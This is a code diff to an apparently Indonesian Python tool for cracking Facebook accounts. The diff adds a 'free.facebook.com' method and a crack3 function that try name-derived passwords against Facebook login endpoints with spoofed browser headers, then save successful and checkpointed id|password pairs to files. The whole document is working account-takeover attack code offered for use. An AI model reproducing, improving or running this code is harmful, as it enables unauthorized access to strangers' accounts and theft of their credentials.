@@ -1,4 +1,6 @@
-
+# Full Open Source Code
+# Coded By @GF-Elite
+# https://www.facebook.com/kananda.widiantara.50
 # https://github.com/GF-Elite
 
 #   Release Date : Jum,11 Feb,2022
@@ -111,7 +113,7 @@ def login_lagi():
 		tes3 = json.loads(tes.text)['id']
 		tes4 = json.loads(tes.text)['birthday']
 		open('token.txt','w').write(panda)
-		sue = '# Login Sukses, Tunggu Sebentar!'
+		sue = '# Login Sukses, Tunggu Sebentar Broo!'
 		suu = mark(sue, style='green')
 		sol().print(suu, style='cyan')
 		time.sleep(2.5)
@@ -476,14 +478,20 @@ def setting():
 		exit()
 	met = '# PILIH METHOD CRACK'
 	sol().print(mark(met, style='green'))
-	ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)'
+	ioz = '[01] Method B-Api (Fast)\n[02] Method Free-fb [Fast] (Recommended)\n[03] Method Mobile [Slow] (Recommended)'
 	gess = nel(ioz, style='cyan')
 	cetak(nel(gess, title='METHOD'))
 	hc = input(x+'['+p+'f'+x+'] Pilih : ')
 	if hc in ['1','01']:
 		method.append('api')
-	else:
+	elif hc in ['2','02']:
+		method.append('free')
+	elif hc in ['3','03']:
 		method.append('mobile')
+	else:
+		ric = '# PILIHAN TIDAK ADA DI MENU'
+		sol().print(mark(ric, style='red'))
+		exit()
 	guw = '# INGIN OPSI CRACK?'
 	sol().print(mark(guw, style='green'))
 	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
@@ -506,7 +514,7 @@ def passwrd():
 			pwv = []
 			if len(nmf)<6:
 				if len(frs)<3:
-					pass
+					continue
 				else:
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
@@ -517,13 +525,13 @@ def passwrd():
 					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
-			pwv.append('sayang')
-			if 'mobile' in method:
+			if 'free' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'api' in method:
 				pool.submit(crack2,idf,pwv)
 			else:
-				pool.submit(crack,idf,pwv)
+				pool.submit(crack3,idf,pwv)
+	if len(akun)==0:exit()
 	print('')
 	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
 	sol().print(mark(tanya, style='green'))
@@ -544,11 +552,9 @@ def crack(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			tix = time.time()
-			head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			dt = {'email': idf,'pass': '#PWD_BROWSER:0:{}:{}'.format(int(tix),pw),'login': 'submit'}
-			z = ses.get('https://m.facebook.com')
-			j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
+			head = {"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			dt = {'email': idf,'pass': pw,'login': 'submit'}
+			j = ses.post('https://free.facebook.com/login.php', data=dt, headers=head, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
@@ -594,6 +600,41 @@ def crack2(idf,pwv):
 					cp+=1
 				break
 			elif "session_key" in resp.text and "EAAA" in resp.text:
+				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				ok+=1
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
+def crack3(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice([u,k,kk,b,h,hh])
+	pers = loop*100/len(id2)
+	fff = '%'
+	print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	ua = random.choice(ugen).replace('\n','')
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			dt = {'email': idf,'pass': pw,'login': 'submit'}
+			z = ses.get('https://m.facebook.com')
+			j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if 'ya' in oprek:
+					akun.append(idf+'|'+pw)
+					ceker(idf,pw)
+				else:
+					print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					akun.append(idf+'|'+pw)
+					cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
 				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
